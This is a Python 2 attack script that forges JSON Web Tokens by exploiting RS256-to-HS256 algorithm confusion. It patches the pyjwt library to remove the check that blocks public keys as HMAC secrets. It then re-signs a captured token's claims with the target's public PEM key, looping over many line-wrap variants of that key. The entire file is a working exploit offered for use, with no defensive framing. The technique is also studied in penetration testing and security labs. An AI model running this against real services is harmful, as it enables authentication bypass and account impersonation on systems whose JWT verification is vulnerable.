#!/usr/bin/env python2
#############################################################
# @AaylaSecura1138, github.com/aayla-secura
# Modify and distribute as you wish
#############################################################

import jwt
import sys
import re
import argparse

def read_file(fname):
    with open(fname, 'r') as f:
        try:
            return f.read()
        except IOError as e:
            sys.stderr.write('Cannot read {}: {}'.format(fname, e))
            return None

########## "Fix" pyjwt
# pyjwt's HMACAlgorithm doesn't allow using public keys as secrets, so
# we override it here, removing the check
class HMACAlgorithm(jwt.algorithms.HMACAlgorithm):
    def prepare_key(self, key):
        key = jwt.utils.force_bytes(key)
        return key

jwt.api_jwt._jwt_global_obj._algorithms['HS256'] = \
        HMACAlgorithm(HMACAlgorithm.SHA256)
jwt.api_jwt._jwt_global_obj._algorithms['HS384'] = \
        HMACAlgorithm(HMACAlgorithm.SHA384)
jwt.api_jwt._jwt_global_obj._algorithms['HS512'] = \
        HMACAlgorithm(HMACAlgorithm.SHA512)

########## Read cmdline
parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        description='''Re-sign a JWT with a public key,
        changing its type from RS265 to HS256. Unless disabled, it
        will re-sign it once for each possible line length of the
        public key (starting at the length of the header line).''')
parser.add_argument('-j', '--jwt-file', dest='jwt_file',
        default='jwt.txt', metavar='FILE',
        help='''File containing the JWT.''')
parser.add_argument('-k', '--key-file', dest='key_file',
        default='key.pem', metavar='FILE',
        help='''File containing the public PEM key.''')
parser.add_argument('-f', '--from-algorithm', dest='from_algorithm',
        default='RS256', metavar='ALGO',
        choices=['RS256', 'RS384', 'RS512'],
        help='''Original algorithm of the JWT.''')
parser.add_argument('-t', '--to-algorithm', dest='to_algorithm',
        default='HS256', metavar='ALGO',
        choices=['HS256', 'HS384', 'HS512'],
        help='''Convert JWT to this algorithm.''')
parser.add_argument('-n', '--no-vary', dest='no_vary',
        default=False, action='store_true',
        help='''Sign only once with the exact key given.''')
args = parser.parse_args()

########## Verify token with public key
pubkey = read_file(args.key_file)
if not pubkey:
    sys.exit(2)

token = read_file(args.jwt_file)
if not token:
    sys.exit(2)

try:
    jwt.decode(token, pubkey, algorithms=args.from_algorithm)
except jwt.exceptions.InvalidSignatureError:
    sys.stderr.write('Wrong public key! Aborting.')
    sys.exit(1)
except: #TODO: catch only jwt.exceptions?
    pass

########## Save original header
claims = jwt.decode(token, verify=False)
headers = jwt.get_unverified_header(token)
del headers['alg']
del headers['typ']

########## Case 1: sign with exact public key only
if args.no_vary:
    sys.stdout.write(jwt.encode(claims, pubkey,
        algorithm=args.to_algorithm,
                headers=headers).decode('utf-8'))
    sys.exit(0)

########## Case 2: vary newlines
lines = pubkey.rstrip('\n').split('\n')
if len(lines) < 3:
    sys.stderr.write('''Make sure public key is in a PEM format and
            includes header and footer lines!''')
    sys.exit(2)

hdr = pubkey.split('\n')[0]
ftr = pubkey.split('\n')[-1]
meat = ''.join(pubkey.split('\n')[1:-1])

sep = '\n-----------------------------------------------------------------\n'
for l in range(len(hdr), len(meat)+1):
    secret = '\n'.join([hdr] + filter(
        None,re.split('(.{%s})' % l, meat)) + [ftr])
    sys.stdout.write(
            '%s--- JWT signed with public key split at lines of length %s: ---%s%s' % \
            (sep, l, sep, jwt.encode(claims, secret,
                algorithm=args.to_algorithm,
                headers=headers).decode('utf-8')))
    secret += '\n'
    sys.stdout.write(
            '%s------------- As above, but with a trailing newline: ------------%s%s' % \
            (sep, sep, jwt.encode(claims, secret,
                algorithm=args.to_algorithm,
                headers=headers).decode('utf-8')))
